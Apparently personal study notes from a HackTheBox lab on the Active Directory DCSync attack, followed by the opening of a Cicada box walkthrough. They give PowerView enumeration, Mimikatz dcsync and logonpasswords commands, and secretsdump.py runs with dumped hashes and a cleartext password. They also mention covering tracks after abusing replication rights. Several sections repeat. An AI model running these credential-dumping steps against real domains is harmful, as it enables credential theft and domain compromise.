href="#Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set" class="headerlink" title="Viewing an Account with Reversible Encryption Password Storage Set"></a>Viewing an Account with Reversible Encryption Password Storage Set</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png" alt="image"></p><p>When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption.<br>The trick here is that the key needed to decrypt them is stored in the registry (the <a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin or equivalent. Tools such as <code>secretsdump.py</code> will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.</p><p>If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the <code>Get-ADUser</code> cmdlet:</p><h4 id="Enumerating-Further-using-Get-ADUser"><a href="#Enumerating-Further-using-Get-ADUser" class="headerlink" title="Enumerating Further using Get-ADUser"></a>Enumerating Further using Get-ADUser</h4><p>  DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-ADUser -Filter &#x27;userAccountControl -band 128&#x27; -Properties userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">GivenName          :</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334</span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">SID                : S-1-5-21-3842939050-3880317879-2865463114-5222</span><br><span class="line">Surname            :</span><br><span class="line">userAccountControl : 640</span><br><span class="line">UserPrincipalName  :</span><br></pre></td></tr></table></figure><p>We can see that one account, <code>proxyagent</code>, has the reversible encryption option set with PowerView as well:</p><h4 id="Checking-for-Reversible-Encryption-Option-using-Get-DomainUser"><a href="#Checking-for-Reversible-Encryption-Option-using-Get-DomainUser" class="headerlink" title="Checking for Reversible Encryption Option using Get-DomainUser"></a>Checking for Reversible Encryption Option using Get-DomainUser</h4><p>  DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-DomainUser -Identity * | ? &#123;$_.useraccountcontrol -like &#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;&#125; |select samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line">--------------                         ------------------</span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure><p>We will notice the tool decrypted the password and provided us with the cleartext value.</p><h4 id="Displaying-the-Decrypted-Password"><a href="#Displaying-the-Decrypted-Password" class="headerlink" title="Displaying the Decrypted Password"></a>Displaying the Decrypted Password</h4><p>  DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext </span><br><span class="line"></span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br></pre></td></tr></table></figure><p>I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.</p><p>We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the <code>krbtgt</code> account and use this to create a <code>Golden Ticket</code> for persistence, but that is outside the scope of this module.</p><p>Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize <code>runas.exe</code> to accomplish this:</p><h4 id="Using-runas-exe"><a href="#Using-runas-exe" class="headerlink" title="Using runas.exe"></a>Using runas.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;runas /netonly /user:INLANEFREIGHT\adunn powershell</span><br><span class="line">Enter the password for INLANEFREIGHT\adunn:</span><br><span class="line">Attempting to start powershell as user &quot;INLANEFREIGHT\adunn&quot; ...</span><br></pre></td></tr></table></figure><p>From the newly spawned powershell session, we can perform the attack:</p><h4 id="Performing-the-Attack-with-Mimikatz"><a href="#Performing-the-Attack-with-Mimikatz" class="headerlink" title="Performing the Attack with Mimikatz"></a>Performing the Attack with Mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line">=================================================================</span><br><span class="line">mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span><br><span class="line">[DC] &#x27;INLANEFREIGHT.LOCAL&#x27; will be the domain</span><br><span class="line">[DC] &#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;INLANEFREIGHT\administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 10/27/2021 6:49:32 AM</span><br><span class="line">Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 4625fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>Credentails in memory -&gt; doesnt work past server 2012</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><code>requires sereplication privilege, check for that acl type</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$SID = Convert-Name-TO-SID &lt;name&gt;</span><br><span class="line">get-domainobjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $SID&#125;</span><br></pre></td></tr></table></figure><p>#dcsyncing</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="dcsync-linux"><a href="#dcsync-linux" class="headerlink" title="dcsync linux"></a>dcsync linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3</span><br></pre></td></tr></table></figure><hr><h2 id="Account-Enumeration"><a href="#Account-Enumeration" class="headerlink" title="Account Enumeration"></a>Account Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</span><br></pre></td></tr></table></figure><h3 id="Checking-user-Groups-SID-ACLs-1"><a href="#Checking-user-Groups-SID-ACLs-1" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p><p>We first get the user’s SID in the above command and then check all ACLs set on the domain object (<code>&quot;DC=inlanefreight,DC=local&quot;</code>) using <a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.<br>Checking for Replication–Get ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sid = &quot;&#123;sid-here&#125;&quot;</span><br><span class="line"></span><br><span class="line">PS&gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#x27;Replication-Get&#x27;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN</span><br></pre></td></tr></table></figure><p>If we had certain rights over the user (such as <a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let’s see a few quick examples.</p><h3 id="exploit-replication-ACE-to-perform-DCsync-1"><a href="#exploit-replication-ACE-to-perform-DCsync-1" class="headerlink" title="exploit  replication ACE to perform DCsync"></a>exploit  replication ACE to perform DCsync</h3><h4 id="impacket-secretsdump-py-1"><a href="#impacket-secretsdump-py-1" class="headerlink" title="(impacket) secretsdump.py"></a>(impacket) secretsdump.py</h4><p>Running the tool as below will write all hashes to files with the prefix <code>inlanefreight_hashes</code>. The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p><p> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span><br><span class="line"></span><br><span class="line">pass:</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br></pre></td></tr></table></figure><p>We can use the <code>-just-dc-ntlm</code> flag if we only want NTLM hashes or specify <code>-just-dc-user &lt;USERNAME&gt;</code> to only extract data for a specific user. Other useful options include <code>-pwd-last-set</code> to see when each account’s password was last changed and <code>-history</code> if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The <code>-user-status</code> is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p><ul><li>Number and % of passwords cracked</li><li>top 10 passwords</li><li>Password length metrics</li><li>Password re-use</li></ul><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:domain&lt;ilfreight\&#123;high-priv-user&#125;tpetty powershell &#123;requires pass&#125;</span><br><span class="line"></span><br><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br></pre></td></tr></table></figure><h4 id="Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set-1"><a href="#Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set-1" class="headerlink" title="Viewing an Account with Reversible Encryption Password Storage Set"></a>Viewing an Account with Reversible Encryption Password Storage Set</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png" alt="image"></p><p>When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption.<br>The trick here is that the key needed to decrypt them is stored in the registry (the <a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin or equivalent. </p><p>Tools such as <code>secretsdump.py</code> will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption.<br>Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the <code>Get-ADUser</code> cmdlet:</p><h4 id="Enumerating-Further"><a href="#Enumerating-Further" class="headerlink" title="Enumerating Further"></a>Enumerating Further</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;userAccountControl -band 128&#x27;</span> <span class="literal">-Properties</span> userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">GivenName          :</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGUID         : c72d37d9<span class="literal">-e9ff-4e54-9afa-77775eaaf334</span></span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">SID                : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5222</span></span><br><span class="line">Surname            :</span><br><span class="line">userAccountControl : <span class="number">640</span></span><br><span class="line">UserPrincipalName  :</span><br></pre></td></tr></table></figure><h2 id="Reversible-Encryption"><a href="#Reversible-Encryption" class="headerlink" title="Reversible Encryption"></a>Reversible Encryption</h2><p>Reversible encryption is a method of storing passwords in a way that they can be decrypted back into their original plain text form.</p><p>Instead of hashing a password (which is one-way), reversible encryption encrypts it in a two-way format — it can be both encrypted and decrypted.</p><p>This is not secure and is generally discouraged because if an attacker gains access to the encrypted passwords, they can easily retrieve the plain-text versions.<br><img src="/../images/reversible-encryp.png" alt="alt text"></p><p>We can see that one account, <code>proxyagent</code>, has the reversible encryption option set with PowerView</p><h3 id="Enumerating-Reversible-Encryption-Option-using-PowerView"><a href="#Enumerating-Reversible-Encryption-Option-using-PowerView" class="headerlink" title="Enumerating Reversible Encryption Option using PowerView"></a>Enumerating Reversible Encryption Option using PowerView</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-DomainUser -Identity * | ? &#123;$_.useraccountcontrol -like &#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;&#125; |select samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line">--------------                         ------------------</span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure><p>We will notice the tool decrypted the password and provided us with the cleartext value.</p><p>Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize<code>runas.exe</code> to accomplish this:</p><h4 id="Using-runas-exe-1"><a href="#Using-runas-exe-1" class="headerlink" title="Using runas.exe"></a>Using runas.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;runas /netonly /user:INLANEFREIGHT\adunn powershell</span><br><span class="line">Enter the password for INLANEFREIGHT\adunn:</span><br><span class="line">Attempting to start powershell as user &quot;INLANEFREIGHT\adunn&quot; ...</span><br></pre></td></tr></table></figure><p>From the newly spawned powershell session, we can perform the attack:</p><h4 id="DCSyncing"><a href="#DCSyncing" class="headerlink" title="DCSyncing"></a>DCSyncing</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">=================================================================</span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">4625</span>fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>Credentails in memory -&gt; doesnt work past server 2012</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><code>requires sereplication privilege, check for that acl type</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$SID = Convert-Name-TO-SID &lt;name&gt;</span><br><span class="line">get-domainobjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $SID&#125;</span><br></pre></td></tr></table></figure><p>#dcsyncing</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="dcsync-linux-1"><a href="#dcsync-linux-1" class="headerlink" title="dcsync linux"></a>dcsync linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mimikatz </tag>
            
            <tag> AD </tag>
            
            <tag> Active Directory </tag>
            
            <tag> Lateral Movement </tag>
            
            <tag> dcsync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Cicada  Walkthrough</title>
      <link href="/2025/01/22/HTB-Cicada/"/>
      <url>/2025/01/22/HTB-Cicada/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/cicada.png" alt="alt text"></h2><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Cicada is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.</p> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>Cicada</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Easy</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>25</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Information gathering reveals several ports open:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 